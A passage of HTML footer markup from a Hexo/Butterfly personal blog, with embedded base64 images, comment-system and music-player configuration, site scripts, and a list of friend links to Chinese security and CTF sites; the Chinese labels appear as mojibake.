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" title="æœ¬ç«™å·²é€šè¿‡å·¥ä¿¡éƒ¨ ICP å¤‡æ¡ˆ"></a><a class="github-badge" target="_blank" href="https://beian.miit.gov.cn/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/%E8%90%8CICP%E5%A4%87-20240052%E5%8F%B7-fe1384?style-flat&amp;logo=data:image/png;base64,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" title="æœ¬ç«™å·²é€šè¿‡èŒå¤‡å¤‡æ¡ˆ"></a></p></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="go-down" type="button" title="åˆ·æ–°é¡µé¢" onclick="window.location.reload()"><i class="fa-solid fa-arrows-rotate"></i></button><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fa-solid fa-book-open-reader"></i></button><button id="translateLink" type="button" title="ç¹ç®€åˆ‡æ¢">ç¹</button><button id="darkmode" type="button" title="æ˜¼å¤œåˆ‡æ¢"><i class="fa-solid fa-moon"></i></button><button id="hide-aside-btn" type="button" title="å…¨å±æ¨¡å¼" onclick="rmf.fullScreen()"><i class="fas fa-expand"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="ç›´è¾¾è¯„è®º"><i class="fa fa-comments"></i></a><button id="go-down" type="button" title="åˆ†äº«æœ¬é¡µ" onclick="rmf.copyWordsLink()"><i class="fa-solid fa-share-from-square"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="ç›´è¾¾åº•éƒ¨" onclick="btf.scrollToDest(document.body.scrollHeight,500)"><i class="fas fa-arrow-down"></i></button></div></div><div class="js-pjax" id="rightMenu"><div class="rightMenu-group rightMenu-small"><a class="rightMenu-item" title="åé€€ä¸€æ­¥" href="javascript:window.history.back();"><i class="fa fa-arrow-left"></i></a><a class="rightMenu-item" title="å‰è¿›ä¸€æ­¥" href="javascript:window.history.forward();"><i class="fa fa-arrow-right"></i></a><a class="rightMenu-item" title="åˆ·æ–°é¡µé¢" href="javascript:window.location.reload();"><i class="fa fa-refresh"></i></a><a class="rightMenu-item" title="ç›´è¾¾é¡¶éƒ¨" href="javascript:btf.scrollToDest(0, 500)"><i class="fa fa-arrow-up"></i></a><a class="rightMenu-item" title="ç›´è¾¾åº•éƒ¨" href="javascript:btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" href="/archives/"><i class="fa-solid fa-calendar-days"></i><span>æ–‡ç« å½’æ¡£</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="fas fa-tags"></i><span>æ–‡ç« æ ‡ç­¾</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="fas fa-folder-open"></i><span>æ–‡ç« åˆ†ç±»</span></a><a class="rightMenu-item" href="javascript:toRandomPost()"><i class="fa fa-paper-plane"></i><span>éšä¾¿é€›é€›</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-text"><a class="rightMenu-item" href="javascript:rmf.copySelect();"><i class="fa fa-copy"></i><span>å¤åˆ¶</span></a><a class="rightMenu-item" href="javascript:window.open(&quot;https://www.bing.com/search?q=&quot;+window.getSelection().toString());window.location.reload();"><i class="fa-brands fa-edge"></i><span>ç”¨Bingæœç´¢</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-too"><a class="rightMenu-item" href="javascript:window.open(window.getSelection().toString());window.location.reload();"><i class="fa fa-link"></i><span>è½¬åˆ°é“¾æ¥</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-paste"><a class="rightMenu-item" href="javascript:rmf.paste()"><i class="fa fa-copy"></i><span>ç²˜è´´</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-post"><a class="rightMenu-item" href="#post-comment"><i class="fa fa-comments"></i><span>ç›´è¾¾è¯„è®º</span></a><a class="rightMenu-item" href="javascript:rmf.copyWordsLink()"><i class="fa fa-link"></i><span>å¤åˆ¶æœ¬æ–‡åœ°å€</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-to"><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>æ–°çª—å£æ‰“å¼€</span></a><a class="rightMenu-item" id="menu-too" href="javascript:rmf.open()"><i class="fa fa-link"></i><span>è½¬åˆ°é“¾æ¥</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>å¤åˆ¶é“¾æ¥</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-img"><a class="rightMenu-item" href="javascript:rmf.saveAs()"><i class="fa fa-download"></i><span>ä¿å­˜å›¾ç‰‡</span></a><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>åœ¨æ–°çª—å£æ‰“å¼€</span></a><a class="rightMenu-item" href="javascript:rmf.click()"><i class="fa fa-arrows-alt"></i><span>å…¨å±æ˜¾ç¤º</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>å¤åˆ¶å›¾ç‰‡é“¾æ¥</span></a></div><div class="rightMenu-group rightMenu-line"><a class="rightMenu-item" href="javascript:rmf.switchDarkMode();"><i class="fa fa-moon"></i><span>æ˜¼å¤œåˆ‡æ¢</span></a><a class="rightMenu-item menu-link" href="/copyright/"><i class="fa-solid fa-copyright"></i><span>æœ¬ç«™åè®®</span></a><a class="rightMenu-item menu-link" href="/about/#reward-me"><i class="fa-sharp fa-solid fa-heart-circle-bolt"></i><span>èµåŠ©æœ¬ç«™</span></a><a class="rightMenu-item menu-link" href="/about/"><i class="fa-regular fa-address-card"></i><span>å…³äºæœ¬ç«™</span></a></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadWaline(){function e(){Waline.init(Object.assign({el:"#waline-wrap",reaction:!0,serverURL:"https://waline.uf4te.cn",avatarCDN:"https://cn.cravatar.com/avatar/",pageview:!0,dark:'html[data-theme="dark"]',path:window.location.pathname,comment:!0,reaction:["https://unpkg.com/@waline/emojis@1.1.0/weibo/weibo_wink.png","https://unpkg.com/@waline/emojis@1.1.0/weibo/weibo_blush.png","https://unpkg.com/@waline/emojis@1.1.0/weibo/weibo_think.png","https://unpkg.com/@waline/emojis@1.1.0/weibo/weibo_awkward.png"]},{locale:{nick:"æ˜µç§° (é€‰å¡«)",mail:"é‚®ç®± (å»ºè®®å¡«å†™)",link:"ä½ çš„ä¸»é¡µ (é€‰å¡«)",placeholder:"è¯·æ–‡æ˜å‘è¨€ï¼Œç‰¢è®°ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ï¼ï¼ˆä¸å¡«å†™æ˜µç§°å’Œé‚®ç®±å¯ä»¥åŒ¿åè¯„è®ºï¼Œä½†å»ºè®®å¡«å†™é‚®ç®±å¯åœ¨è¢«å›å¤æ—¶æ”¶åˆ°é‚®ä»¶æé†’ï¼Œé‚®ç®±ä¿¡æ¯ä¸ä¼šè¢«å…¬å¼€ï¼‰",requiredMeta:[],sofa:"æœ‰ä»€ä¹ˆæƒ³è¯´çš„ï¼Ÿå¿«æ¥å‘è¡¨è¯„è®ºæŠ¢æ²™å‘å§ï¼",login:"ç™»å½• (å¯é€‰)",anonymous:"æŸä¸çŸ¥åç½‘å‹",level0:"æ½œæ°´",level1:"å†’æ³¡",level2:"åæ§½",level3:"æ´»è·ƒ",level4:"è¯ç—¨",level5:"ä¼ è¯´",reactionTitle:"æ„Ÿè§‰æ€ä¹ˆæ ·ï¼Œè¯„ä»·ä¸€ä¸‹ï¼Ÿ",reaction0:"æ„Ÿè§‰å¾ˆèµ",reaction1:"æ”¯æŒä¸€ä¸‹",reaction2:"æ„Ÿè§‰ä¸€èˆ¬",reaction3:"å‹‰å‹‰å¼ºå¼º"}}))}const n=document.getElementById("waline-css");"object"==typeof Waline?n?e():getCSS("/css/waline.css","waline-css").then(e):getCSS("/css/waline.css","waline-css").then((()=>{getScript("/js/waline.js").then(e)}))}{function loadOtherComment(){loadWaline()}setTimeout(loadWaline,0)}</script></div><script>window.addEventListener("load",(()=>{const e=e=>{let t="";if(e.length)for(let n=0;n<e.length;n++){t+="<div class='aside-list-item'>";{const a="data-lazy-src";t+=`<a href='${e[n].url}' class='thumbnail'><img ${a}='${e[n].avatar}' alt='${e[n].nick}'></a>`}t+=`<div class='content'>\n        <a class='comment' href='${e[n].url}' title='${e[n].content}'>${e[n].content}</a>\n        <div class='name'><span>${e[n].nick} / </span><time datetime="${e[n].date}">${btf.diffDate(e[n].date,!0)}</time></div>\n        </div></div>`}else t+="æ²¡æœ‰è¯„è®º";let n=document.querySelector("#card-newest-comments .aside-list");n.innerHTML=t,window.lazyLoadInstance&&window.lazyLoadInstance.update(),window.pjax&&window.pjax.refresh(n)},t=()=>{if(document.querySelector("#card-newest-comments .aside-list")){const t=saveToLocal.get("waline-newest-comments");t?e(JSON.parse(t)):(()=>{const t=()=>{Waline.RecentComments({serverURL:"https://waline.uf4te.cn",count:13}).then((({comments:t})=>{let n=t.filter((e=>"uf4te"!==e.nick));n.length<3&&(n=n.concat(t.filter((e=>"uf4te"===e.nick)).slice(0,3-n.length)));const a=n.slice(0,3).map((e=>{return{content:(t=e.comment,""===t||(t=(t=(t=(t=t.replace(/<img.*?src="(.*?)"?[^\>]+>/gi,"[å›¾ç‰‡]")).replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi,"[é“¾æ¥]")).replace(/<pre><code>.*?<\/pre>/gi,"[ä»£ç ]")).replace(/<[^>]+>/g,"")).length>150&&(t=t.substring(0,150)+"..."),t),avatar:e.avatar,nick:e.nick,url:e.url+"#"+e.objectId,date:e.insertedAt};var t}));saveToLocal.set("waline-newest-comments",JSON.stringify(a),10/1440),e(a)})).catch((e=>{document.querySelector("#card-newest-comments .aside-list").innerHTML="æ— æ³•è·å–è¯„è®ºï¼Œè¯·ç¡®è®¤ç›¸å…³é…ç½®æ˜¯å¦æ­£ç¡®"}))};"object"==typeof Waline?t():getScript("/js/waline.js").then(t)})()}};t(),document.addEventListener("pjax:complete",t)}))</script><script src="/js/jquery.min.js"></script><script src="/js/sakura.js"></script><script data-pjax="" src="/js/footer_beautification.js"></script><canvas id="universe"></canvas><script src="/js/universe.js"></script><script src="/js/title.js"></script><script async data-pjax="" src="/js/fps.js"></script><script async data-pjax="" src="/js/txmap.js"></script><script src="/js/console.js"></script><script src="/js/hotsearch.js"></script><div class="aplayer no-destroy" data-id="8252365535" data-server="netease" data-type="playlist" data-order="random" data-fixed="true" data-autoplay="false" data-theme="#00C4B6" data-volume="0.8" data-mutex="true" data-listmaxheight="330px"></div><script src="//npm.elemecdn.com/pace-js@1.2.4/pace.min.js"></script><script async data-pjax="" src="/js/timing.js"></script><script data-pjax="" src="/js/rightmenu.js"></script><script src="/js/random.js"></script><script src="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/jinrishici.js"></script><script data-pjax="" src="/js/poem.js"></script><script src="/js/chuckle-post-ai.js"></script><script data-pjax="" defer>new ChucklePostAI({el:"#post>#article-container",key:"e3524467cea76d785e9a",title_el:".post-title",interface:{name:"uf4te çš„ AI å°åŠ©æ‰‹",introduce:"Heyï¼Œä½ å¥½ï¼å¾ˆé«˜å…´è§åˆ°ä½ ï¼æˆ‘æ˜¯ uf4te çš„æ–‡ç« è¾…åŠ© AIï¼Œç‚¹å‡»ä¸‹æ–¹çš„æŒ‰é’®ï¼Œæˆ‘å¯ä»¥ä¸ºä½ ç”Ÿæˆæœ¬æ–‡æ‘˜è¦ã€æ¨èç›¸å…³æ–‡ç« ï¼ˆé¦–æ¬¡ç”Ÿæˆå¯èƒ½ä¼šæ¯”è¾ƒæ…¢ï¼Œè¯·æ‚¨è€å¿ƒç­‰å¾…ä¸€å°ä¼šï¼Œè°¢è°¢ç†è§£å“¦~ï¼‰",version:"GPT-3.5",button:["ä»‹ç»è‡ªå·±","æ¨èç›¸å…³æ–‡ç« ","ç”Ÿæˆæœ¬æ–‡æ‘˜è¦","çŸ©é˜µç©¿æ¢­"]},hide_shuttle:!0,pjax:!0,summary_toggle:!1,summary_speech:!0})</script><script data-pjax="" src="/js/random-friends-post.js"></script><script data-pjax="" src="/js/pagination.js"></script><script async data-pjax="" src="/js/commentsum.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="â™¡å¯Œå¼ºâ™¡,â™¡æ°‘ä¸»â™¡,â™¡æ–‡æ˜â™¡,â™¡å’Œè°â™¡,â™¡è‡ªç”±â™¡,â™¡å¹³ç­‰â™¡,â™¡å…¬æ­£â™¡,â™¡æ³•æ²»â™¡,â™¡çˆ±å›½â™¡,â™¡æ•¬ä¸šâ™¡,â™¡è¯šä¿¡â™¡,â™¡å‹å–„â™¡" data-fontsize="16px" data-random="false" async></script><link rel="stylesheet" href="/js/APlayer/APlayer.min.css" media="print" onload='this.media="all"'><script src="/js/APlayer/APlayer.min.js"></script><script src="/js/APlayer/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors=["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"];var pjax=new Pjax({elements:'a:not([target="_blank"])',selectors:pjaxSelectors,cacheBust:!1,analytics:!1,scrollRestoration:!1});document.addEventListener("pjax:send",(function(){if(window.tocScrollFn&&window.removeEventListener("scroll",window.tocScrollFn),window.scrollCollect&&window.removeEventListener("scroll",scrollCollect),document.getElementById("rightside").style.cssText="opacity: ''; transform: ''",window.aplayers)for(let e=0;e<window.aplayers.length;e++)window.aplayers[e].options.fixed||window.aplayers[e].destroy();"object"==typeof typed&&typed.destroy();const e=document.body.classList;e.contains("read-mode")&&e.remove("read-mode"),"object"==typeof disqusjs&&disqusjs.destroy()})),document.addEventListener("pjax:complete",(function(){window.refreshFn(),document.querySelectorAll("script[data-pjax], .pjax-reload script").forEach((e=>{const t=document.createElement("script"),o=e.text||e.textContent||e.innerHTML||"";Array.from(e.attributes).forEach((e=>t.setAttribute(e.name,e.value))),t.appendChild(document.createTextNode(o)),e.parentNode.replaceChild(t,e)})),GLOBAL_CONFIG.islazyload&&window.lazyLoadInstance.update(),"function"==typeof chatBtnFn&&chatBtnFn(),"function"==typeof panguInit&&panguInit(),"function"==typeof gtag&&gtag("config","",{page_path:window.location.pathname}),"object"==typeof _hmt&&_hmt.push(["_trackPageview",window.location.pathname]),"function"==typeof loadMeting&&document.getElementsByClassName("aplayer").length&&loadMeting(),"object"==typeof Prism&&Prism.highlightAll()})),document.addEventListener("pjax:error",(e=>{404===e.request.status&&pjax.loadUrl("/404.html")}))</script><div class="pjax-reload"><script async>for(var arr=document.getElementsByClassName("recent-post-item"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__fadeInLeft"),arr[i].setAttribute("data-wow-duration","600ms"),arr[i].setAttribute("data-wow-delay","200ms"),arr[i].setAttribute("data-wow-offset","100"),arr[i].setAttribute("data-wow-iteration","1")</script><script async>for(var arr=document.getElementsByClassName("card-widget"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__fadeInRightBig"),arr[i].setAttribute("data-wow-duration",""),arr[i].setAttribute("data-wow-delay",""),arr[i].setAttribute("data-wow-offset",""),arr[i].setAttribute("data-wow-iteration","")</script></div><script defer src="https://cdn.jsdelivr.net/gh/graingert/wow@1.3.0/dist/wow.min.js"></script><script defer src="/js/wow_init.js"></script></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">æœç´¢</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div><div class="js-pjax"><script async>for(var arr=document.getElementsByClassName("recent-post-item"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__fadeInLeft"),arr[i].setAttribute("data-wow-duration","600ms"),arr[i].setAttribute("data-wow-delay","200ms"),arr[i].setAttribute("data-wow-offset","100"),arr[i].setAttribute("data-wow-iteration","1")</script><script async>for(var arr=document.getElementsByClassName("card-widget"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__fadeInRightBig"),arr[i].setAttribute("data-wow-duration",""),arr[i].setAttribute("data-wow-delay",""),arr[i].setAttribute("data-wow-offset",""),arr[i].setAttribute("data-wow-iteration","")</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script></body></html><script>var flinks=["https://hexo.io/zh-cn/","https://nodejs.org/en/","https://butterfly.js.org/","https://cnhuazhu.top/","https://www.fomal.cc/","https://guole.fun/","https://akilar.top/","https://zykj.js.org/","https://blog.eurkon.com/","https://fe32.top/","https://blog.anheyu.com/","https://meuicat.com/","https://blog.zhheo.com/","https://blog.justlovesmile.top/","https://uuanqin.top/","https://blog.leonus.cn/","https://aeneag.xyz/","https://www.52pojie.cn/","https://www.kanxue.com/","https://www.anquanke.com/","https://www.freebuf.com/","https://blog.xmcve.com/","https://ctf-wiki.org/","https://bestwing.me/","https://houjingyi233.com/","https://paper.seebug.org/","https://security.tencent.com/index.php/blog/","https://xlab.tencent.com/cn/","https://www.ctfiot.com/blog/","https://www.iotsec-zone.com/article/original","https://www.yuque.com/cyberangel/rg9gdm/","https://www.yuque.com/u239977/","https://www.yuque.com/hxfqg9/","https://blog.aabyss.cn/","https://wiki.wgpsec.org/","https://www.cnblogs.com/trunk","https://lazzzaro.github.io/","https://zikh26.github.io/","https://bbs.ka